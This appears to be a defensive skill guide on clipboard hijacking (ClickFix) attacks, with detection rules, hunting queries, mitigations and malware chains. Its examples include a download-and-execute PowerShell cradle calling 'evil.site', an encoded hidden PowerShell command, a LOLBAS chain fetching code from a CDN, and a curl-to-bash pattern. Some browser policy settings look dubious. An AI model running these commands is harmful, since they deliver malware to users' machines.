---
name: clipboard-hijacking-analysis
description: Analyze clipboard hijacking (pastejacking) attacks, ClickFix campaigns, and IUAM-style verification page lures. Use this skill whenever investigating phishing campaigns that use clipboard manipulation, fake CAPTCHA pages, or social engineering to execute commands via Win+R/Terminal paste. Also use for threat hunting clipboard-based attacks, analyzing pastejacking payloads, or building detection rules for clipboard-to-console attack chains.
---

# Clipboard Hijacking (Pastejacking) Analysis

A skill for analyzing clipboard hijacking attacks, understanding attack chains, and building defensive controls.

## When to Use This Skill

Use this skill when:
- Investigating phishing campaigns that don't use attachments or downloads
- Analyzing fake CAPTCHA/IUAM verification pages that coerce clipboard paste
- Threat hunting for ClickFix, ClearFake, or pastejacking attack patterns
- Building detection rules for clipboard-to-console attack chains
- Understanding how attackers abuse the Clipboard API for command execution
- Reviewing suspicious PowerShell/CMD/Terminal executions after browser activity

## Attack Overview

Clipboard hijacking (pastejacking) exploits the user habit of copying and pasting commands without inspection. Attackers programmatically place malicious text in the clipboard, then socially engineer victims to paste it into a console (Win+R, Terminal, PowerShell).

**Key advantage**: No file download, no attachment opened — bypasses email/web security controls.

## Common Attack Patterns

### 1. ClickFix / ClearFake Flow

```
1. User visits typosquatted/compromised site
2. JavaScript silently writes Base64 PowerShell to clipboard
3. HTML instructs: "Press Win+R, paste, hit Enter to fix"
4. PowerShell executes → downloads archive → DLL sideloading → RAT
```

**Typical payload structure:**
```powershell
powershell -nop -w hidden -enc <BASE64-PS1>
```

Decodes to download cradles like:
```powershell
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f
%TEMP%\f\jp2launcher.exe  # Sideloads malicious DLL
```

### 2. IUAM-Style Verification Pages

Fake "Just a moment..." CAPTCHA pages that:
- Detect OS via `navigator.userAgent`
- Copy OS-specific payloads on checkbox click
- Show benign text on screen, malicious command in clipboard
- Block mobile users (can't paste into console easily)

**Clipboard mismatch pattern:**
```javascript
const shown = 'copy this: echo ok';  // What user sees
const real = isWin ? psWin : shMac;  // What gets copied
navigator.clipboard.writeText(real);
```

### 3. 2026 Evolutions (ClearFake, Scarlet Goldfinch)

- **LOLBAS abuse**: `SyncAppvPublishingServer.vbs` via `WScript.exe`
- **Blockchain obfuscation**: POSTs to BSC testnet RPC endpoints
- **CDN staging**: jsDelivr, GitHub, Cloudflare Workers for payload hosting
- **Fake CAPTCHA**: Instructs copy/paste instead of download

**Example LOLBAS chain:**
```cmd
"C:\WINDOWS\System32\WScript.exe" 
  "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" 
  "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr.net/gh/.../p1ilot')"
```

## Detection Guidance

### Windows Endpoint Detection

**Process tree patterns:**
```
explorer.exe → powershell.exe -c → wscript.exe <temp>\a.js
explorer.exe → cmd.exe → batch from %TEMP%
explorer.exe → wscript.exe SyncAppvPublishingServer.vbs
```

**Registry artifacts:**
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` — check for Base64/obfuscated entries
- Startup LNK files in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`

**Event IDs to monitor:**
- **4688** (Process Creation): Parent=`explorer.exe`, Child in {`powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`}
- **4663** (File Access): File creation in `%LocalAppData%\Microsoft\Windows\WinX\` or `%TEMP%`
- **4697** (Service Install): Persistence mechanisms

**Command-line indicators:**
- `powershell -NoProfile -NonInteractive -Command -` with large stdin
- `.split('').reverse().join('')` obfuscation patterns
- `eval(a.responseText)` in WScript/CScript calls
- `SyncAppvPublishingServer.vbs` with external URLs
- `WinHttp.WinHttpRequest.5.1` with `-ep bypass`

### macOS Endpoint Detection

**Process patterns:**
```
Terminal/iTerm → bash → curl → base64 -d → bash
```

**Key indicators:**
- `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`
- Background jobs surviving terminal close
- Clipboard writes followed by Terminal process creation

### Network Detection

**C2 patterns:**
- Daily-rotating domains with `/Y/?t=<epoch>&v=5&p=<encoded>`
- Outbound to CDN workers (jsDelivr, Cloudflare) from script hosts
- Blockchain RPC endpoints (e.g., `bsc-testnet.drpc.org`)

**Suspicious user agents:**
- `MSXML2.XMLHTTP` with reversed URLs
- `WinHttp.WinHttpRequest.5.1` from PowerShell

### Browser/EDR Detection

**Clipboard API abuse:**
- `navigator.clipboard.writeText()` on verification widgets
- Clipboard write immediately followed by console process creation
- Mismatch between displayed text and clipboard content

**DOM manipulation:**
- `document.documentElement.innerHTML = html` (page takeover)
- Tailwind CSS injection on compromised sites

## Threat Hunting Queries

### Splunk/SentinelOne-style

```splunk
index=windows_logs EventCode=4688 
| where ParentImage="explorer.exe" 
  AND NewProcessName IN ("powershell.exe", "wscript.exe", "mshta.exe")
| where CommandLine LIKE "%-enc%" OR CommandLine LIKE "%-nop%"
| stats count by NewProcessName, CommandLine
```

```splunk
index=windows_logs EventCode=4688 
| where ParentImage="explorer.exe" AND NewProcessName="wscript.exe"
| where CommandLine LIKE "%SyncAppvPublishingServer.vbs%"
| table _time, ComputerName, CommandLine
```

### PowerShell Hunting Script

```powershell
# Check RunMRU for suspicious entries
$RunMRU = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -ErrorAction SilentlyContinue
$RunMRU.PSObject.Properties | Where-Object {
    $_.Name -ne 'Default' -and $_.Name -ne '(default)' -and $_.Name -ne 'a' -and $_.Name -ne 'MRUList'
} | ForEach-Object {
    $value = $_.Value
    if ($value -match 'powershell|wscript|mshta|base64|-enc|-nop') {
        Write-Output "Suspicious RunMRU entry: $($_.Name) = $value"
    }
}
```

## Mitigation Strategies

### 1. Browser Hardening

**Chrome/Edge policies:**
```json
{
  "dom_events_asyncClipboard_clipboardItem": false,
  "dom_events_asyncClipboard_writeText": false
}
```

**Firefox about:config:**
- `dom.events.asyncClipboard.clipboardItem` → `false`
- `clipboard.autocopy` → `false`

### 2. PowerShell Hardening

```powershell
# Constrained Language Mode
Set-ExecutionPolicy -ExecutionPolicy AllSigned -Scope LocalMachine

# Block encoded commands
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell" 
  -Name "EnableScriptBlockLogging" -Value 1 -Force

# Application Control (WDAC)
# Block: powershell.exe -enc, -nop -w hidden
```

### 3. User Training

**Key messages:**
- "Never paste anything you did not copy yourself"
- "Type sensitive commands instead of pasting"
- "Paste into text editor first to inspect"
- "Fake CAPTCHA pages asking for console paste are malicious"

### 4. Network Controls

- Block outbound to known pastejacking C2 domains
- Alert on script hosts (WScript, CScript, MSHTA) making HTTP requests
- Monitor for connections to blockchain RPC endpoints from endpoints

## Malware Families Associated with Pastejacking

| Malware | Typical Chain |
|---------|---------------|
| NetSupport RAT | PowerShell → ZIP → DLL sideloading → RAT |
| Latrodectus | PowerShell → JScript → MSI → DLL sideloading |
| Lumma Stealer | MSHTA → PowerShell → CAB extraction → AutoIt |
| PureHVNC | PowerShell → WScript → JS → Startup LNK |

## Example Payload Analysis

When analyzing a suspicious payload:

1. **Decode Base64**: `powershell -enc <BASE64>` → decode the string
2. **Check for obfuscation**: Look for `.split('').reverse().join('')`, variable aliases
3. **Identify LOLBins**: `mshta`, `wscript`, `cscript`, `regsvr32`, `SyncAppvPublishingServer.vbs`
4. **Trace the chain**: Download → Extract → Execute → Persist
5. **Check persistence**: Scheduled tasks, Run keys, Startup folder LNKs

## Related Techniques

- **Discord Invite Hijacking**: Same ClickFix approach after luring to malicious server
- **Website Cloning**: Compromised sites inject pastejacking JavaScript
- **Homograph Attacks**: Typosquatted domains for ClickFix delivery

## References

- [Unit 42: Fix the Click - Preventing ClickFix](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC - GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point: Under the Pure Curtain](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Unit 42: The ClickFix Factory](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [Red Canary: February 2026 Intelligence](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
